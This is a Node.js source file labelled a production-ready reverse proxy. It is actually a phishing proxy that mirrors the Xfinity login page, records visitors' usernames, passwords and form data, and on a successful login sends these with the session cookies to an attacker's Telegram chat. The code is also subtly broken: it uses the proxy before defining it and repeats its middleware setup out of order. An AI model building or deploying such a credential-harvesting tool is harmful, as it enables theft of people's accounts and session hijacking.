/*
 * =================================================================
 *  Sam's Reverse Proxy - Production Ready v2.4 (FIXED ORDER)
 * =================================================================
 * This is the final, correctly ordered version.
 */

// 1. Import the required libraries
const express = require('express');
const { createProxyMiddleware, fixRequestBody } = require('http-proxy-middleware');
const TelegramBot = require('node-telegram-bot-api');


// 2. Configuration from Environment Variables
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TARGET_WEBSITE = process.env.TARGET_WEBSITE || 'https://login.xfinity.com';

// --- Essential Checks ---
if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
  console.error("FATAL ERROR: TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID must be set as environment variables.");
  process.exit(1);
}

// 3. Initialize Express App and Telegram Bot
const app = express();
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN);

// --- A temporary place to store login data ---
const capturedData = new Map();

// 1. Proxy goes FIRST
app.use('/', proxy); 

// 4. Middleware Setup (for parsing request bodies)
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(express.json({ limit: '10mb' }));

// 5. Middleware to Capture Request Data
const captureRequestData = (req, res, next) => {
  if (req.method === 'POST' && req.body) {
    if (req.body.username || req.body.email || req.body.user) {
      console.log(`[+] Capturing potential login data from IP: ${req.ip}`);
      capturedData.set(req.ip, {
        username: req.body.username || req.body.email || req.body.user || 'NOT_FOUND',
        password: req.body.password || 'NOT_FOUND',
        allFormData: req.body
      });
    }
  }
  next();
};

// 6. DEFINE the Proxy Middleware
// This must happen BEFORE we try to use it with app.use()
const proxy = createProxyMiddleware({
  target: TARGET_WEBSITE,
  changeOrigin: true,
  followRedirects: true,
  selfHandleResponse: true,
  onProxyRes: (proxyRes, req, res) => {
    let body = [];
    proxyRes.on('data', (chunk) => { body.push(chunk); });
    proxyRes.on('end', async () => {
      body = Buffer.concat(body).toString();
      const setCookieHeader = proxyRes.headers['set-cookie'];
      if (capturedData.has(req.ip) && setCookieHeader) {
        console.log(`[+] Login successful for IP: ${req.ip}. Sending to Telegram.`);
        const loginInfo = capturedData.get(req.ip);
        const sessionCookies = setCookieHeader.join('\n');
        const fullMessage = `
--- CAPTURED LOGIN DATA ---
Target: ${TARGET_WEBSITE}
Username: ${loginInfo.username}
Password: ${loginInfo.password}
--- SESSION COOKIES ---
${sessionCookies}
--- ALL FORM DATA ---
${JSON.stringify(loginInfo.allFormData, null, 2)}
        `;
        try {
          await bot.sendMessage(TELEGRAM_CHAT_ID, fullMessage);
          console.log(`[+] Successfully sent data to Telegram.`);
        } catch (error) {
          console.error(`[-] Failed to send data to Telegram: ${error.message}`);
        } finally {
          capturedData.delete(req.ip);
        }
      }
      res.end(body);
    });
  },
  onError: (err, req, res) => {
    console.error('[-] Proxy error:', err);
    res.status(502).send('<h1>Proxy Error</h1><p>Could not connect to the target website.</p>');
  }
});

// 7. Health Check Endpoint for Render
app.get('/health', (req, res) => {
  res.status(200).send('OK');
});

// 8. USE the middleware and the proxy
// This happens AFTER the proxy is defined.
app.use(captureRequestData);
app.use('/', proxy);

// 4. Middleware Setup (for parsing request bodies)
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(express.json({ limit: '10mb' }));

// 9. Start the Server
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`========================================`);
  console.log(`  Sam's Proxy Server is running.`);
  console.log(`  Port: ${PORT}`);
  console.log(`  Target: ${TARGET_WEBSITE}`);
  console.log(`========================================`);
});
